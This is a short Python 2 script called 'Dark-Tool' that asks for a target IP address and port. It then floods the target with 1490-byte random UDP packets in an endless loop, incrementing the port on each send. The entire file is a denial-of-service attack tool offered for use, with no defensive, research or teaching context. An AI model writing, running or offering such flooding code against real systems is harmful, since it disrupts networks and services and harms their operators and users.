import random,socket, os, sys, subprocess
import string, thread
from time import sleep
os.system("clear")

from datetime import datetime
now= datetime.now()
hour= now.hour
minute= now.minute
second= now.second

sock=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes=random._urandom(1490)

print ("********************")
print ("Welcome to Dark-Tool")
print ("********************")

nome=raw_input("Your Name:")

print ("Wait.....")
print ("So,%s,Tell Me The Ip") %(nome)

print ("Targed Ip")
ip=raw_input("Dark~:")

print ("Targed Port")
port=input("Dark~:")

print ("So,%s, Wait a minute...") %(nome)

print
sent= 0
while True:
     sock.sendto(bytes,(ip,port))
     sent= sent + 1
     port= port + 1
     print ("Sent %s packet to %s throught port:%s") %(sent,ip,port)
 
